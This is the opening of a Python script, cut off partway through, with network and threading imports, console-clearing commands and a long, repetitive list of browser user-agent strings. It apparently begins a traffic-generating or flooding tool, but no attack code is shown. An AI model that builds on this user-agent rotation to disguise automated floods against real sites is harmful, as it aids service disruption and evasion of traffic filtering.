import random, socket, threading
import os, socket, threading, colorsys, time, random
import socket
import sys
import sys
import ssl
import datetime
import os
import ctypes
import time
import random
import threading
import base64 as b64
from types import MethodType
import string
import json
import sys
os.system("color D")
time.sleep(3)
os.system("cls")
on1 = 8
cl = 25
exp = 943.5
time.sleep(0)

useragents = [
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
